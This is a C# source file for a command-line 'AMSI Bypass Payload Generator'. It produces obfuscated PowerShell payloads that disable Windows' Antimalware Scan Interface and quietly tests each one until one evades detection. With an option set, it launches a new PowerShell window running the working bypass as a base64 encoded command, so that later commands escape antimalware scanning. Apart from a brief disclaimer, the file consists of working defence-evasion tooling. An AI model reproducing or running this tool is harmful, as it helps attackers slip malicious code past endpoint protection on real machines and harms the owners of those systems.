using System;
using System.Text;
using System.Diagnostics;
using System.Linq;

namespace AMSIBypass.CLI
{
    class Program
    {
        static void Main(string[] args)
        {
            PrintBanner();

            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "-h":
                    case "--help":
                    case "help":
                        PrintHelp();
                        return;
                    case "-f":
                    case "--file":
                    case "file":
                        GenerateToFile(args);
                        return;
                    case "-b":
                    case "--bypass":
                    case "bypass":
                        GenerateAndTestBypass(args);
                        return;
                    default:
                        if (args[0].StartsWith("-"))
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"Unknown option: {args[0]}");
                            Console.ResetColor();
                            PrintHelp();
                            return;
                        }
                        break;
                }
            }

            // Default: Generate single payload
            GenerateSingle();
        }

        static void PrintBanner()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(@"

   ___    __  _________ ____
  / _ |  /  |/  / __(_) _ )__ _____ ___ ____ ___ ___
 / __ | / /|_/ /\ \/ / _  / // / _ \/ _ `(_-<(_-<
/_/ |_|/_/  /_/___/_/____/\_, / .__/\_,_/___/___/
                         /___/_/            
                             
AMSI Bypass Payload Generator
");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️");
            Console.WriteLine("Educational and research purposes only.");
            Console.WriteLine("Misuse may violate laws and regulations.\n");
            Console.ResetColor();
        }

        static void PrintHelp()
        {
            Console.WriteLine("Usage: AMSIBypass.CLI [OPTIONS]\n");
            Console.WriteLine("Options:");
            Console.WriteLine("  (none)              Generate a single obfuscated AMSI bypass payload");
            Console.WriteLine("  -f, --file <path>   Save payload to specified file");
            Console.WriteLine("  -b, --bypass [n]    Test payloads until bypass found (max n attempts, default 5)");
            Console.WriteLine("  -i, --inject        Use with -b to inject bypassed payload into new PowerShell window");
            Console.WriteLine("  -h, --help          Show this help message\n");
            Console.WriteLine("Examples:");
            Console.WriteLine("  AMSIBypass.CLI                    # Generate and display payload");
            Console.WriteLine("  AMSIBypass.CLI -f bypass.txt      # Save to file");
            Console.WriteLine("  AMSIBypass.CLI -b                 # Test until bypass found (display only)");
            Console.WriteLine("  AMSIBypass.CLI -b -i              # Test and inject bypass into new PowerShell");
        }

        static void GenerateSingle()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Generating obfuscated AMSI bypass payload...\n");
            Console.ResetColor();

            string payload = Generator.GetPayload();
            
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("═══════════════════════════════════════════════════════════════");
            Console.WriteLine("PAYLOAD:");
            Console.WriteLine("═══════════════════════════════════════════════════════════════");
            Console.WriteLine(payload);
            Console.WriteLine("═══════════════════════════════════════════════════════════════\n");
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Copy the payload above and paste it into PowerShell.");
            Console.ResetColor();
        }


        static void GenerateToFile(string[] args)
        {
            string filename = args.Length > 1 ? args[1] : "amsi_bypass.ps1";

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Generating payload and saving to {filename}...\n");
            Console.ResetColor();

            string payload = Generator.GetPayload();

            try
            {
                System.IO.File.WriteAllText(filename, payload);
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"✓ Payload saved successfully to: {filename}");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine($"\nRun with: powershell.exe -ExecutionPolicy Bypass -File {filename}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"✗ Error saving file: {ex.Message}");
                Console.ResetColor();
            }
        }


        static void GenerateAndTestBypass(string[] args)
        {
            // Check if -i/--inject flag is present
            bool shouldInject = args.Any(a => a.ToLower() == "-i" || a.ToLower() == "--inject" || a.ToLower() == "inject");

            int maxAttempts = 5; // default
            // Parse max attempts from args (skip -i flag if present)
            for (int i = 1; i < args.Length; i++)
            {
                if (int.TryParse(args[i], out int parsed))
                {
                    maxAttempts = parsed;
                    break;
                }
            }

            if (maxAttempts < 1 || maxAttempts > 200)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Please specify a count between 1 and 200.");
                Console.ResetColor();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Green;
            if (shouldInject)
            {
                Console.WriteLine($"Starting bypass testing with injection (max {maxAttempts} attempts)...");
            }
            else
            {
                Console.WriteLine($"Starting bypass testing (max {maxAttempts} attempts)...");
            }
            Console.WriteLine("Testing payloads until one bypasses AMSI detection...\n");
            Console.ResetColor();

            for (int attempt = 1; attempt <= maxAttempts; attempt++)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write($"[Attempt {attempt}/{maxAttempts}] ");
                Console.ResetColor();
                Console.Write("Generating and testing payload... ");

                string payload = Generator.GetPayload();
                TestResult result = TestPayload(payload);

                if (result.Bypassed)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("✓ BYPASS SUCCESSFUL!\n");
                    Console.ResetColor();

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"✓ Found working bypass on attempt {attempt}!\n");
                    Console.ResetColor();

                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("═══════════════════════════════════════════════════════════════");
                    Console.WriteLine("BYPASSED PAYLOAD:");
                    Console.WriteLine("═══════════════════════════════════════════════════════════════");
                    Console.WriteLine(payload);
                    Console.WriteLine("═══════════════════════════════════════════════════════════════\n");
                    Console.ResetColor();

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"Total attempts: {attempt}");
                    Console.WriteLine("This payload successfully bypassed AMSI detection.");
                    Console.ResetColor();

                    // Inject into new PowerShell window if -i flag is present
                    if (shouldInject)
                    {
                        Console.WriteLine();
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("🚀 Injecting bypass into new PowerShell window...");
                        Console.ResetColor();

                        try
                        {
                            // Use base64 encoded command to avoid ALL quote escaping issues
                            string encodedPayload = Convert.ToBase64String(Encoding.Unicode.GetBytes(payload));

                            var startInfo = new ProcessStartInfo
                            {
                                FileName = "powershell.exe",
                                Arguments = $"-NoExit -ExecutionPolicy Bypass -NoLogo -EncodedCommand {encodedPayload}",
                                UseShellExecute = true,
                                CreateNoWindow = false
                            };

                            Process.Start(startInfo);

                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine("✓ Bypass injected successfully!");
                            Console.WriteLine("\nA new PowerShell window has opened with AMSI bypassed.");
                            Console.WriteLine("You can now run any commands without AMSI interference.");
                            Console.ResetColor();
                        }
                        catch (Exception ex)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine($"✗ Failed to inject: {ex.Message}");
                            Console.ResetColor();
                        }
                    }

                    return;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("✗ Blocked");
                    Console.ResetColor();
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine($"    {result.ErrorMessage}");
                    Console.ResetColor();
                }
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"\n⚠ No bypass found after {maxAttempts} attempts.");
            Console.WriteLine("Try running again or increase max attempts.");
            Console.ResetColor();
        }

        static TestResult TestPayload(string payload)
        {
            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-ExecutionPolicy Bypass -NoProfile -NoLogo -NonInteractive -Command \"{payload}\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    // Read streams asynchronously to avoid deadlock
                    var stdoutTask = process.StandardOutput.ReadToEndAsync();
                    var stderrTask = process.StandardError.ReadToEndAsync();
                    
                    process.WaitForExit();
                    
                    string stdout = stdoutTask.Result;
                    string stderr = stderrTask.Result;
                    
                    // Combine all output for checking
                    string combinedOutput = (stdout + " " + stderr).ToLower();
                    
                    // Check for AMSI block messages (case-insensitive)
                    bool isBlocked = combinedOutput.Contains("malicious content") ||
                                    combinedOutput.Contains("blocked by your antivirus") ||
                                    combinedOutput.Contains("this script contains malicious") ||
                                    combinedOutput.Contains("blocked by amsi") ||
                                    combinedOutput.Contains("amsi scan") ||
                                    (combinedOutput.Contains("amsi") && combinedOutput.Contains("block"));
                    
                    // Non-zero exit code often indicates an error
                    bool hasError = process.ExitCode != 0;
                    
                    // If blocked by AMSI or error occurred, it's not bypassed
                    if (isBlocked || (hasError && !string.IsNullOrWhiteSpace(stderr)))
                    {
                        string errorMsg = isBlocked ? "AMSI blocked the payload" : "PowerShell execution failed";
                        return new TestResult
                        {
                            Bypassed = false,
                            ErrorMessage = errorMsg,
                            ExitCode = process.ExitCode
                        };
                    }
                    
                    // Success: No AMSI block detected and no errors
                    return new TestResult
                    {
                        Bypassed = true,
                        ErrorMessage = "",
                        ExitCode = process.ExitCode
                    };
                }
            }
            catch (Exception ex)
            {
                return new TestResult
                {
                    Bypassed = false,
                    ErrorMessage = $"Execution error: {ex.Message}",
                    ExitCode = -1
                };
            }
        }
    }

    class TestResult
    {
        public bool Bypassed { get; set; }
        public string ErrorMessage { get; set; }
        public int ExitCode { get; set; }
    }
}
